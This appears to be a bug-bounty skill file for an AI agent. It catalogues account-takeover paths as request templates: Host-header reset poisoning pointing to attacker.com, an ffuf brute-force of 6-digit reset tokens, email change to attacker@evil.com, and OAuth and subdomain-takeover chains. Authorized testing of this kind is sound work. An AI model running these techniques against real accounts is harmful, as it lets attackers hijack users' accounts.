---
name: hunt-ato
description: "Hunt account takeover taxonomy — 9 distinct paths to ATO, plus chains. Paths: (1) password reset flaws (host header injection redirects token to attacker, predictable token, token leaked in referer, race condition on reset link), (2) email change without re-auth, (3) OAuth account-link CSRF, (4) MFA bypass (per hunt-mfa-bypass), (5) session-fixation, (6) JWT manipulation, (7) password change without step-up (chain with password oracle), (8) social-recovery question abuse, (9) SSO subdomain takeover. Chain primitives: cookie theft + password oracle + missing step-up = persistent ATO; OAuth open redirect + redirect_uri = auth code theft = ATO; subdomain takeover at OAuth redirect_uri = ATO. Validate: actual account takeover demonstration on test account B from attacker A's session. Real paid examples for each path. Use when hunting ATO chains, when testing password reset / email change / MFA / OAuth / session, when chaining primitives toward Critical."
---

## 13. ATO — ACCOUNT TAKEOVER TAXONOMY

### Path 1: Password Reset Poisoning
```bash
POST /forgot-password
Host: attacker.com          # or X-Forwarded-Host: attacker.com
email=victim@company.com
# Reset link sent to attacker.com/reset?token=XXXX
```

### Path 2: Reset Token in Referrer Leak
```
GET /reset-password?token=ABC123
→ page loads: <script src="https://analytics.com/track.js">
→ Referer: https://target.com/reset-password?token=ABC123 sent to analytics
```

### Path 3: Predictable / Weak Reset Tokens
```bash
# Brute force 6-digit numeric token
ffuf -u "https://target.com/reset?token=FUZZ" \
     -w <(seq -w 000000 999999) -fc 404 -t 50
```

### Path 4: Token Not Expiring
```
Request token → wait 2 hours → still works? = bug
Request token #1 → request token #2 → use token #1 → still works? = bug
```

### Path 5: Email Change Without Re-Auth
```bash
PUT /api/user/email
{"new_email": "attacker@evil.com"}   # no current_password required
```

### ATO Priority Chain
- Critical: no-user-interaction ATO
- High: requires one email click OR existing session
- Medium: requires phishing + user interaction
- Low: requires attacker to be MitM

---

## Related Skills & Chains

- **`hunt-idor`** — The most reliable ATO primitive that requires no email control and no race. Chain primitive: `PATCH /api/users/{victim_uid}` with attacker session + victim UID + `{"email":"attacker@evil.com"}` → trigger password reset → reset email arrives at attacker → full ATO with zero victim interaction (Critical path).
- **`hunt-mfa-bypass`** — Password reset / email change without re-auth is only Critical if it bypasses MFA too. Chain primitive: password-change endpoint accepts new password without current-password challenge AND without MFA step-up → cookie theft (XSS or token leak) + password oracle (timing diff on login) → set new password from stolen cookie → MFA-less ATO from any IP/device.
- **`hunt-oauth`** — OAuth misconfigurations are the highest-yield no-interaction ATO path. Chain primitive: OAuth `redirect_uri` validation accepts subdomain match (`*.target.com`) + `hunt-subdomain` reveals a dangling CNAME on `staging.target.com` → claim that subdomain on Heroku/S3 → host an OAuth callback there → victim clicks crafted authorize URL → code lands on attacker subdomain → exchange for token → ATO.
- **`hunt-misc`** — Host-header injection on password reset is the canonical Path 1 primitive. Chain primitive: `POST /forgot-password` with `Host: attacker.com` (or `X-Forwarded-Host`) → reset email constructs link from request Host header → link points to `attacker.com/reset?token=XXXX` → victim clicks → token leaked to attacker → ATO.
- **`security-arsenal`** — Pull the Password-Reset Bypass Tables for host-header variants (`X-Forwarded-Host`, `X-Host`, `X-HTTP-Host-Override`, dual-Host smuggling), token-entropy payloads (sequential numeric, time-based predictable), and the always-rejected list for "rate-limit on /forgot-password" reports.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an ATO that requires the victim to click a link AND enter credentials AND complete CAPTCHA. The reproducibility step (10-minute fresh-browser walkthrough on test account B from attacker A's session) is what separates Critical-paid from Self-XSS-tier rejected.

